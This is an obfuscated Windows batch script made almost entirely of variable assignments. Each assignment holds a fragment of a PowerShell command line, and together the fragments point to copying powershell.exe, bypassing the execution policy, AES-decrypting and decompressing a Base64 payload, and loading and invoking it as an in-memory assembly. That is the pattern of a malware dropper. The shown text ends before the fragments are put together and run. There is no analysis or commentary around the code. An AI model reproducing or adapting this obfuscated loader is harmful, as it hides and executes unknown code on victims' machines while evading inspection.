@echo off
set "JCHDSTmITD=py"
set "gVimwzbZEd=he"
set "qSJMXWSYxU=st"
set "nnZDUOzBIZ=ll"
set "NOmWHbNPgZ=0\"
set "fzVrPLcDmL=xe"
set "lYoLoHLuPY=we"
set "eHemLOrFRg= /"
set "cVHlrdMlUi=Po"
set "xYMhirRHAH=\W"
set "ydvgYncCRy=ow"
set "cqjLVbtNpx=rs"
set "dSHFAynaVk=rS"
set "ZoeviFNIGc=Wi"
set "FtnZdDYdVU=co"
set "QGJXykocKS=\v"
set "wzWLyCDepD=he"
set "PMqKcAyNQf=1."
set "jBuxDvyUns=s\"
set "hemwxEyJZB=ws"
set "CkRhSUDhSU=em"
set "uceRzAdZRI=ll"
set "ptZhXeewqs=.e"
set "JDqvXCfVIP= C"
set "wGamFONRab=we"
set "OwoGtYQdPK=Sy"
set "vXFwpbdRcB=nd"
set "BSeqhczPOu=y "
set "unimuzmlOm=po"
set "vIkVhgnZaV=do"
set "CzwsPEFhOz=in"
set "CjEKMbOOMa=32"
set "VvAfLtKLov=:\"
set "HXQlJmkLYA= %~dp0"
set "hwJYOgYzLd=cd"
set "kcTveZmRQV=bDGn"
set "xOacdxNcIK=stem"
set "ngBBiwtVVR=ne.I"
set "qzLNHewOmK=dV1k"
set "DlWZshFTHa=ateD"
set "VISRpMXeot=R5jf"
set "CsXUNCtQgZ=and "
set "dziuTKaBAE=tion"
set "RdVUoZBrGM=grap"
set "OhCwtjTxKx=[Sys"
set "DLxjgNqwdg=stem"
set "oRkLYUDlvW=[Sys"
set "PsDjuDZzdv=.IO."
set "FEBQLChWfA=ddin"
set "BuYicbtoYq=ptog"
set "gjLIXthlUG=BC;$"
set "uRCYbNLyZI=rZ ="
set "LmzmbYauJC= if "
set "wFVxLWzQIf=3); "
set "KaOqvkEgww=flec"
set "xhzwKHNTUE=rofi"
set "KlEwqBwXRv=;$Wr"
set "CNGOKPXaTF=a) {"
set "zMProfVrYN=-joi"
set "CvTkGtbUwN=qR.D"
set "xSooixlcIM=pose"
set "NaoGVREgcx=ss -"
set "EqbfoLTSAv=ispo"
set "KMoEbyPUuV=.Con"
set "duARpQyWxk=Conv"
set "LwZnAxYXso=aDNK"
set "KXZAwcFIbP=tS46"
set "sZFiVaQgrY=$RYa"
set "rTRVPZzwET=tem."
set "zkLwQNyNqj= New"
set "bJGvaKjKXk=.Dis"
set "RyiMPvtaKR=pres"
set "NDXIDFykuK=pStr"
set "AgogRAzOyd=sIsw"
set "zPUYsxqwIa==');"
set "pLOsXekviE=ring"
set "FJUNOvcuTs= [Sy"
set "vDqySYGiJu=TllA"
set "aqEXvBLggJ=Fina"
set "RbVGvhhUTp=]::N"
set "wXpXwHlJRu=oryS"
set "xdOWRaxMgn=g = "
set "ZKwZAsGoYS=);$I"
set "SEjAafpBRE=n ''"
set "lYftXAfPmr=EdMU"
set "ysnaOLQLgT=bstr"
set "ceBIBszAzV=-Obj"
set "BGopJjUjFq=XLrZ"
set "KROAezNxLT=onve"
set "XAMVbFBnkE=-joi"
set "vDGugODCmX=.Sec"
set "piYmYftCqm=B = "
set "uxtXbxgOkN=oL'["
set "LvZcRRpjfE=n ''"
set "XPeBOIeUbX=.Mem"
set "yOiyhUDshk=r = "
set "tzOTgFpJDc=Mode"
set "FJeKRAnlrf='[-1"
set "GDQGhfUgEm=in $"
set "SdPFDYpRGy=morF"
set "BXuRBUGVJL=oArr"
set "NCkgEEchco=ing("
set "hOBCCxfyEC=zm83"
set "HBKZwElShS=.Cry"
set "HOadsWwSGA=.-16"
set "sGlIhsWxak=esMa"
set "KfSLujfVcX=RYaS"
set "RygwWOVjtY=();$"
set "WdaKRObxgP=ode]"
set "SeRTYopGVt=e = "
set "TWaUyyzNmt=G.Su"
set "sqbuXHyejE=fore"
set "bEYgEoXYkZ=ect "
set "FYlvCxfvVa=-ep "
set "FOfuiAHwWq=daeR"
set "GzoCykBgjP=[Env"
set "ClVYippTxJ=em.I"
set "mdjySLaLai=th('"
set "NrNeXIGgeK=tryP"
set "OPGJmyQpnn=nage"
set "ATAkiEGvjk=tsWi"
set "bsRKGPUqkr=ck($"
set "eVLPEUmaHk=ress"
set "kdsvaaZspc=6esa"
set "cwlDtPJaXo=Stre"
set "optrdxPpbI=..-1"
set "qTwvTanCBE=7kGw"
set "XqepVQBEOw= = $"
set "gXMSbVbuMm=-1.."
set "eWWiWkvVHp=);$N"
set "avmvSgDehZ=ert]"
set "XgdOGrjPGA=m.IO"
set "LyStIgQQbO=ptor"
set "MfquRPLwAx=comp"
set "yReTVsntQV=tem."
set "lQtOjRNGSc=saqR"
set "vYkcGRZvKQ=R = "
set "zKSxyIAUyR=rans"
set "bnQEhHXOMT=();$"
set "KcoclUuWqT=V = "
set "yBMDEAmQcg=kyhK"
set "GbguPtGLgD=gnir"
set "cXHPIshBlW=yaZ."
set "PtOjNBojMF=jaAe"
set "ipVyqLQZLM=ay()"
set "dlYxEfgGee=orF'"
set "DpoZkRkkPX=y]::"
set "sEMUBgBMcv=le  "
set "crhknAJbGS=]::C"
set "sAKMMPJUoR===')"
set "kquWdYQgMy=.Ass"
set "GQSiymcwMT=ke($"
set "XckqfpBlsO=THxh"
set "dFXITqSVvd=.Cop"
set "ewnZuKzNrv=Disp"
set "kzahhDKyCf= '')"
set "jzOqozWdTn=comm"
set "NCDBhszlOv=('%*'"
set "OcbgzuFRmx=('da"
set "CWkysTYugS=::('"
set "zSXEoFWKbq='[-1"
set "ptkCnqEnlJ=DGne"
set "ZSiLfiqNFF=DGne"
set "HDCqlmNVHN=tem."
set "PzCrntUrJu=mory"
set "LAzTlIlEUT=CuSj"
set "eOQYHjtaSx=);$X"
set "iTGuFwNEXY=V.En"
set "hgpiTZTzTT=ct S"
set "WfqehCfZFN=ress"
set "nldvdaHrsU=ose("
set "usSgHOEmvd=form"
set "KnrAKyqVMk='gni"
set "KuJsDrMTqU=k; }"
set "YoqDlnOntc=[Sys"
set "hTmZADTBhP=Star"
set "cdqvXavwNg=.Mod"
set "PjlQthjcyw=esaB"
set "SUUunuhvEV=YaSB"
set "RQkWOCNOaq=bypa"
set "jDmKKGhuXy=6] -"
set "WtNPdoEYtb=B, 0"
set "mZcaikGaEL=$RYa"
set "WgBVQcmxYo=tEx "
set "zvDJaPnbgz== $b"
set "MamOmSWcVr=MUG."
set "KUFjEIOfzq=huly"
set "MHmwwrfdvF=[]] "
set "HKbDeMqcIA= = N"
set "WTfPSQutzj=8kuY"
set "oeCuFVsfWz=rZ.T"
set "qYNTpINxDH=IoO3"
set "mgVdyRxJIm=Secu"
set "SYsyQrcUHp=ea ="
set "vqsNSqvWgc=ose("
set "skfaJOhEnI=)($R"
set "iaPYoVFnTI=('ev"
set "bHbPzgsemx=Invo"
set "rgHVVwzISo=B = "
set "cXMsZEtmIk=[IO."
set "UKlNgcIDKP=Xsaq"
set "VOwyOCBCyE=$CUA"
set "eGZlbQNJdI=2VUN"
set "blKAJGUWAK=1..-"
set "GuBJvmDnpZ=;$hu"
set "GvWPYInczD=YaSB"
set "BbhmbiWgmh=ptog"
set "YEsPlpkUeH='')("
set "GBZtJeVyKC=.Com"
set "fHMVRUOfJN=);$b"
set "MRGpHoXFbG=DGne"
set "InaEeVrBcQ='oPV"
set "TNFLLedEhz=7;$b"
set "ipToIOydae=Comp"
set "lGllqIyfIF=);$b"
set "PyHMgtFiHI=ypto"
set "vUPNYKrJkt=stem"
set "MNcCpWlHCN=join"
set "PzhDKzQhfr=rZ);"
set "TNZIevsCpG=$bDG"
set "NazsCSsMwQ=PKCS"
set "nkUKXcoXhi=eam("
set "wsLYXSxQoR=; };"
set "dtLtMGaQlu=lyV "
set "WlDOwuGiRf=t Sy"
set "xPGaOPTRNZ=1] -"
set "DgFMRXYloo=..-1"
set "cvgqxpGPIz=GyaZ"
set "OGWzKrYQlG=)($U"
set "DGTthwlksy=raph"
set "BMjBmRvXrD=y.Cr"
set "hgmvqXfPQb=se()"
set "ZgEsRHWNnG=Obje"
set "iNwSfpsnOv=Ex.T"
set "FtEMImYOVK=.Cre"
set "UkrsYNNNkJ=rity"
